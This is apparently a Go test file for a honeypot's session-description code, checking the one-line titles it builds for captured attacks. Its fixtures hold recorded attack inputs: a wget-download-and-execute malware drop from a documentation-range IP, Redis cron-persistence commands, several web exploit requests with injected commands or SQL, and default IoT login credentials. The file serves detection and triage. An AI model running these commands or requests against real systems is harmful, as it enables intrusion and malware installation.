package describe

import (
	"net"
	"strings"
	"testing"

	"github.com/pcaphub/flypaper/internal/classify"
	"github.com/pcaphub/flypaper/internal/session"
)

func sess(flows int, ports ...int) *session.Session {
	s := &session.Session{Remote: net.ParseIP("198.51.100.7"), LocalPorts: ports}
	for i := 0; i < flows; i++ {
		s.Flows = append(s.Flows, session.Flow{RemPort: 40000 + i, LocPort: ports[i%len(ports)]})
	}
	return s
}

func TestTitles(t *testing.T) {
	cases := []struct {
		name string
		r    classify.Result
		s    *session.Session
		want string
	}{
		{"rdp cookie", classify.Result{Class: classify.ServiceProbe, Facts: classify.Facts{Services: []string{"rdp"}, LocalPorts: []int{3389}, Payloads: []string{"Cookie: mstshash=hello"}}}, sess(1, 3389),
			`RDP probe on :3389, connection cookie "hello"`},
		{"mssql spray via odbc", classify.Result{Class: classify.LoginBruteforce, Facts: classify.Facts{Services: []string{"mssql"}, LocalPorts: []int{1433}, LoginAttempts: 3, TopCreds: []string{"sa:"}, ClientVersion: "Microl office / ODBC / SERVER"}}, sess(3, 1433),
			"MSSQL brute force: 3 login attempts, sa:(empty) (Microl office / ODBC / SERVER)"},
		{"vnc spray", classify.Result{Class: classify.LoginBruteforce, Facts: classify.Facts{Services: []string{"tcp", "vnc"}, LocalPorts: []int{5900}, LoginAttempts: 8}}, sess(8, 5900),
			"VNC brute force: 8 login attempts"},
		{"ssh brute force", classify.Result{Class: classify.SSHBruteforce, Facts: classify.Facts{Services: []string{"ssh"}, LoginAttempts: 48, TopCreds: []string{"root:123456", "admin:admin", "root:root"}, ClientVersion: "SSH-2.0-libssh2_1.9.0"}}, sess(20, 22),
			"SSH brute force: 48 login attempts, root:123456, admin:admin (libssh2_1.9.0)"},
		{"telnet bot", classify.Result{Class: classify.TelnetIoT, Facts: classify.Facts{Services: []string{"telnet"}, LoginSuccess: []string{"root:xc3511"}, Commands: []string{"enable", "system", "shell", "sh", "cat /proc/mounts", "/bin/busybox ECCHI"}}}, sess(1, 23),
			"Telnet IoT bot as root:xc3511: enable, system, shell, +3 more"},
		{"malware", classify.Result{Class: classify.MalwareDownload, Facts: classify.Facts{Services: []string{"ssh"}, LoginSuccess: []string{"root:admin"}, Commands: []string{"cd /tmp; wget http://203.0.113.9/bins/x86_64 -O .x; chmod +x .x; ./.x"}, URLs: []string{"http://203.0.113.9/bins/x86_64"}}}, sess(1, 22),
			"SSH bot drops x86_64 binary via wget from 203[.]0[.]113[.]9 as root:admin"},
		{"phpunit", classify.Result{Class: classify.WebExploit, Facts: classify.Facts{Services: []string{"http"}, LocalPorts: []int{8080}, HTTPRequests: []string{"GET /", "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"}}}, sess(2, 8080),
			"Web exploit attempt on :8080: PHPUnit eval-stdin RCE (CVE-2017-9841)"},
		{"unknown exploit", classify.Result{Class: classify.WebExploit, Facts: classify.Facts{Services: []string{"http"}, LocalPorts: []int{80}, HTTPRequests: []string{"GET /cgi-bin/nobody.cgi?x=;id"}}}, sess(1, 80),
			"Web exploit attempt: GET /cgi-bin/nobody.cgi?x=;id"},
		{"http probe", classify.Result{Class: classify.ServiceProbe, Facts: classify.Facts{Services: []string{"http"}, LocalPorts: []int{8080}, HTTPRequests: []string{"GET /", "GET /favicon.ico", "GET /robots.txt", "GET /sitemap.xml", "GET /admin"}}}, sess(5, 8080),
			"HTTP probe on :8080: /, /favicon.ico, /robots.txt (+2)"},
		{"redis", classify.Result{Class: classify.ServiceProbe, Facts: classify.Facts{Services: []string{"redis"}, LocalPorts: []int{6379}, Commands: []string{"INFO", "CONFIG SET dir /var/spool/cron", "SET x y"}}}, sess(1, 6379),
			"Redis probe on :6379: INFO, CONFIG SET, SET x"},
		{"sweep", classify.Result{Class: classify.ScanOnly, Facts: classify.Facts{LocalPorts: []int{10443, 443, 8443, 7443, 9443}}}, sess(5, 443, 7443, 8443, 9443, 10443),
			"Port sweep: 443, 7443, 8443, 9443, 10443"},
		{"one port", classify.Result{Class: classify.ScanOnly, Facts: classify.Facts{LocalPorts: []int{445}}}, sess(6, 445),
			"6 connection attempts to port 445 (SMB)"},
		{"telnet login only", classify.Result{Class: classify.TelnetIoT, Facts: classify.Facts{Services: []string{"telnet"}, LoginSuccess: []string{"root:cxlinux"}}}, sess(1, 23),
			"Telnet login accepted as root:cxlinux, no commands"},
		{"rdp spray with empty password", classify.Result{Class: classify.LoginBruteforce, Facts: classify.Facts{Services: []string{"rdp"}, LocalPorts: []int{3389}, LoginAttempts: 280, TopCreds: []string{"anonymous:"}}}, sess(20, 3389),
			"RDP brute force: 280 login attempts, anonymous:(empty)"},
		{"ssh login", classify.Result{Class: classify.SSHLoginSuccess, Facts: classify.Facts{Services: []string{"ssh"}, LoginSuccess: []string{"root:password"}, ClientVersion: "SSH-2.0-Go"}}, sess(1, 22),
			"SSH login accepted as root:password, no commands (Go)"},
		{"forward", classify.Result{Class: classify.PortForward, Facts: classify.Facts{Services: []string{"ssh"}, LoginSuccess: []string{"root:root"}, Forwards: []string{"203.0.113.5:25"}}}, sess(1, 22),
			"SSH port forwarding attempt as root:root to 203[.]0[.]113[.]5:25"},
	}
	for _, c := range cases {
		if got := Title(c.r, c.s); got != c.want {
			t.Errorf("%s:\n got  %q\n want %q", c.name, got, c.want)
		}
	}
}

func TestTitleIsBounded(t *testing.T) {
	long := "GET /" + strings.Repeat("a", 300)
	r := classify.Result{Class: classify.WebExploit, Facts: classify.Facts{Services: []string{"http"}, HTTPRequests: []string{long}}}
	got := Title(r, sess(1, 80))
	if len(got) > maxTitle || !strings.HasSuffix(got, "...") {
		t.Errorf("len %d: %q", len(got), got)
	}
	if strings.Contains(Title(classify.Result{Class: classify.ScanOnly}, sess(0)), "\n") {
		t.Error("newline in title")
	}
}

func TestTitleSafe(t *testing.T) {
	cases := map[string]string{
		"Telnet IoT bot as enable\\x00:linuxshell\\x00: system":        "Telnet IoT bot as enable:linuxshell: system",
		"Redis session: info, \x00\x01\xff\xfe S O \x80\x81G, +1 more": "Redis session: info, ? S O ?G, +1 more",
		"plain title":         "plain title",
		"tabs\tand\nnewlines": "tabs and newlines",
	}
	for in, want := range cases {
		if got := titleSafe(in); got != want {
			t.Errorf("titleSafe(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestServiceExploitTitle(t *testing.T) {
	r := classify.Result{Class: classify.ServiceExploit, Facts: classify.Facts{Services: []string{"redis"}, LocalPorts: []int{6379}, Commands: []string{"INFO", "CONFIG SET dir /var/spool/cron", "CONFIG SET dbfilename root", "SAVE"}}}
	if got := Title(r, sess(1, 6379)); got != "Redis exploit attempt: INFO, CONFIG SET, SAVE, +1 more" {
		t.Errorf("got %q", got)
	}
}

func TestDayOneTitles(t *testing.T) {
	cases := []struct {
		reqs []string
		want string
	}{
		{[]string{"GET /SDK/webLanguage"}, "Web exploit attempt: Hikvision camera command injection (CVE-2021-36260)"},
		{[]string{"GET /%2577eb%2575i_%2577sma_Http"}, "Web exploit attempt: Cisco IOS XE web UI authentication bypass (CVE-2023-20198)"},
		{[]string{"POST /.well-known/pki-validation/update"}, "Web exploit attempt: Webshell upload via pki-validation path"},
		{[]string{"GET /cacti/auth_profile.php?tab=general&header=false"}, "Web exploit attempt: Cacti auth_profile.php guest access probe (4HTTP2SHELL step 1)"},
		{[]string{"GET /cacti/auth_profile.php?tab=general&header=false", "POST /cacti/auth_profile.php?tab=general&action=update_data&header=false __csrf_magic=sid:x&name=preview_graphs_per_page&value=1;UPDATE poller_item SET host_id=1,action=1,arg1=0x6964 WHERE local_data_id=1;--"}, "Web exploit attempt: Cacti guest profile SQL injection to RCE (4HTTP2SHELL, Cacti 1.2.31)"},
		{[]string{"GET /graph_realtime.php?action=init&local_graph_id=1&ds_step=10&size=90"}, "Web exploit attempt: Cacti guest profile SQL injection to RCE (4HTTP2SHELL, Cacti 1.2.31)"},
	}
	for _, c := range cases {
		r := classify.Result{Class: classify.WebExploit, Facts: classify.Facts{Services: []string{"http"}, LocalPorts: []int{80}, HTTPRequests: c.reqs}}
		if got := Title(r, sess(1, 80)); got != c.want {
			t.Errorf("%v: got %q", c.reqs, got)
		}
	}
	r := classify.Result{Class: classify.ServiceProbe, Facts: classify.Facts{Services: []string{"http"}, LocalPorts: []int{8080}, HTTPRequests: []string{"GET http://azenv.net/"}}}
	if got := Title(r, sess(1, 8080)); got != "Open proxy probe on :8080: http://azenv.net/" {
		t.Errorf("proxy: %q", got)
	}
}
